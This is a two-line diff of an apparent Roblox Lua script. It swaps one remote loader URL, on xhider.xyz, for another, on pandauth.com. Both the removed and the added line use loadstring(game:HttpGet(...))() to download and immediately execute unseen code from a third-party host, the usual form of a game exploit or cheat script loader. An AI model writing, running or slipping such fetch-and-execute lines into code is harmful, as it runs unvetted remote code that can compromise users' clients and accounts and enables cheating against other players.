@@ -1,2 +1,1 @@
-script_key = "KEY";
-loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/20505fa625bb408a858d286cba85627a.lua"))()
+loadstring(game:HttpGet("https://vault.pandauth.com/vss/9c0baa227adcbd90"))()
